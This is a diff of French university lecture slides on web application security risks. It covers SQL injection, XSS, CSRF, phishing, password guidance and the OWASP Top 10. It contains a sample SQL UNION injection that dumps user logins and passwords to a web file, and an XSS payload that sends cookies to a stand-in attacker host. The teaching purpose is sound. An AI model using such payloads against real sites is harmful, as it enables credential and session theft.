@@ -4,7 +4,7 @@
 
 ## Risques applicatifs des app web{.title}
 
-<footer>HE-Arc (DGR) 2016</footer>
+<footer>HE-Arc (DGR) 2017</footer>
 
 # Risque
 
@@ -45,7 +45,7 @@
 
 ```sql
 SELECT titre, num FROM livres WHERE num=2 UNION
-SELECT login, password FROM user INTO DUMPFILE 'www/public/exploit.txt'
+SELECT login, password FROM user INTO DUMPFILE 'www/exploit.txt'
 ```
 
 # Eviter les injections SQL
@@ -74,7 +74,7 @@ SELECT login, password FROM user INTO DUMPFILE 'www/public/exploit.txt'
 
 ```html
 <img src="http://www.urlinexistante.com/im.jpg"
-     onerror="window.location='http://www.pirate.com/recuperationcookie.jsp?
+     onerror="window.location='http://www.pirate.com/recupcookie.jsp?
      cookie='+document.cookie';">
 ```
 
@@ -94,7 +94,7 @@ SELECT login, password FROM user INTO DUMPFILE 'www/public/exploit.txt'
 * Envoi par mail ou post forum de liens ou images
 * Les URL correspondent à actions (vote, suppression, ...)
 
-[Exemple][3]
+[Exemple][3] (SOP, CORS)
 
 # Phishing
 
@@ -108,6 +108,7 @@ SELECT login, password FROM user INTO DUMPFILE 'www/public/exploit.txt'
 
 # Risques non liés à l'application
 
+* IoT : souvent mal sécurisé ([shodan.io][20])
 * DoS
 * Spoofing (IP, DNS, ARP)
 * Buffer Overflows (surtout en C)
@@ -123,6 +124,11 @@ SELECT login, password FROM user INTO DUMPFILE 'www/public/exploit.txt'
 * Our passwords habits [revealed][19]
 * xkcd's [password strength][6]
 * [passwordless][7] authentication
+* 2017 : [NIST 800-63-3][21] suivi par la [NCSC][22]
+	* Mots de passe longs plutôt qu’avec des caractères spéciaux
+	* Ne forcer le changement qu’en cas de nécessité
+	* Autoriser et accompagner l’utilisation de password managers
+	* Utiliser la 2FA
 
 # Collecte d'information
 * Toute information est bonne pour l'attaquant
@@ -152,7 +158,7 @@ SELECT login, password FROM user INTO DUMPFILE 'www/public/exploit.txt'
 1. Injection
 2. Broken Authentication
 3. Sensitive Data Exposure
-4. XML External Entities (XXE) 
+4. XML External Entities ([XXE][23]) 
 5. Broken Access Control
 6. Security Misconfiguration
 7. Cross Site Scripting (XSS) 
@@ -195,6 +201,10 @@ SELECT login, password FROM user INTO DUMPFILE 'www/public/exploit.txt'
 [17]:https://www.owasp.org/index.php/Mobile_Top_10_2016-Top_10
 [18]:https://www.owasp.org/images/5/57/OWASP_Proactive_Controls_2.pdf
 [19]:http://visual.ly/our-password-habits-revealed
+[20]:https://www.shodan.io/
+[21]:https://nakedsecurity.sophos.com/2016/08/18/nists-new-password-rules-what-you-need-to-know/
+[22]:https://www.ncsc.gov.uk/guidance/password-guidance-simplifying-your-approach
+[23]:https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/
 
 <!-- Hack -->
 <style>
